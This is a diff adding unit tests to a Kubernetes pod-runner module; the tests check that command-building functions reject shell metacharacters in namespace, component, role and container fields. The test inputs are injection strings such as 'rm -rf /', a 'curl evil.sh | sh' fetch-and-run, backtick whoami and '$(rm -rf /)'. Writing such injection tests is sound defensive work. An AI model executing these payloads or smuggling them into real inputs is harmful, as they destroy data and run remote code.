@@ -68,6 +68,12 @@ describe('k8s/pod-runner', () => {
       expect(remote.startsWith("'")).to.be.false
       expect(remote.endsWith("'")).to.be.false
     })
+
+    it('rejects a namespace/component/role containing shell metacharacters', () => {
+      expect(() => buildListPodsArgs({...conn, namespace: 'sa-test; rm -rf /'})).to.throw(/Invalid namespace/)
+      expect(() => buildListPodsArgs({...conn, component: 'api`whoami`'})).to.throw(/Invalid component/)
+      expect(() => buildListPodsArgs({...conn, role: 'app && curl evil.sh | sh'})).to.throw(/Invalid role/)
+    })
   })
 
   describe('buildDiscoverLabelsArgs', () => {
@@ -93,6 +99,12 @@ describe('k8s/pod-runner', () => {
       const remote = args.at(-1)!
       expect(remote.startsWith("'")).to.be.false
       expect(remote.endsWith("'")).to.be.false
+    })
+
+    it('rejects a namespace containing shell metacharacters (e.g. an unvalidated --namespace override)', () => {
+      expect(() => buildDiscoverLabelsArgs({...conn, namespace: "sa-test'; touch /tmp/pwned; echo '"})).to.throw(
+        /Invalid namespace/,
+      )
     })
   })
 
@@ -159,6 +171,13 @@ describe('k8s/pod-runner', () => {
       expect(match, 'expected a base64 token in the remote command').to.not.be.null
       const decoded = Buffer.from(match![1], 'base64').toString('utf8')
       expect(decoded).to.equal('whoami; echo $HOME')
+    })
+
+    it('rejects a namespace/container containing shell metacharacters', () => {
+      expect(() => buildPodExecArgs({...conn, namespace: 'sa-test$(rm -rf /)'}, 'pod-1', 'pwd')).to.throw(
+        /Invalid namespace/,
+      )
+      expect(() => buildPodExecArgs({...conn, container: 'app; id'}, 'pod-1', 'pwd')).to.throw(/Invalid container/)
     })
   })
 
